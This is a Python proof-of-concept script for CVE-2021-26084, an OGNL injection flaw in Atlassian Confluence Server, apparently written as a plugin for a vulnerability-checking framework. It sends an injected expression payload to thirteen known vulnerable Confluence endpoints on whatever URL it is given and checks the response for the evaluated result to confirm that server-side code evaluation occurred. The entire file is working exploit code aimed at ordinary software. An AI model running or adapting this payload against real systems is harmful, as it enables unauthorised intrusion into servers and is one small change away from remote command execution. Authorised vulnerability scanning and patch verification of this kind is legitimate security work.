# title: Atlassian Confluence Server 注入漏洞 CVE-2021-26084
# author: antx
# cveid: CVE-2021-26084

from poctools import BasicPoc
import time


class AtlassianConfluenceServerPoc(BasicPoc):
    def __init__(self) -> None:
        super(AtlassianConfluenceServerPoc, self).__init__()
        self.name = "Atlassian Confluence Server 注入漏洞"

    def verify(self, url: str) -> bool:
        payload = 'queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb'
        host = url.split('//')[1]
        header = {
            'Host': host,
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.set_headers(header)
        paths = [
            'pages/createpage-entervariables.action?SpaceKey=x',
            'pages/createpage-entervariables.action',
            'confluence/pages/createpage-entervariables.action?SpaceKey=x',
            'confluence/pages/createpage-entervariables.action',
            'wiki/pages/createpage-entervariables.action?SpaceKey=x',
            'wiki/pages/createpage-entervariables.action',
            'pages/doenterpagevariables.action',
            'pages/createpage.action?spaceKey=myproj',
            'pages/templates2/viewpagetemplate.action',
            'pages/createpage-entervariables.action',
            'template/custom/content-editor',
            'templates/editor-preload-container',
            'users/user-dark-features'
        ]
        for path in paths:
            target = f'{url}/{path}'
            try:
                resp = self.post(target, data=payload)
                if resp.status_code == 200 and 'value="aaaa{140592=null}' in resp.text:
                    return True
            except Exception as e:
                continue
            time.sleep(1)
        return False


if __name__ == '__main__':
    target = "http://127.0.0.1:8090"
    poc = AtlassianConfluenceServerPoc()
    result = poc.run(target)
    print(f"{target} -> {result}")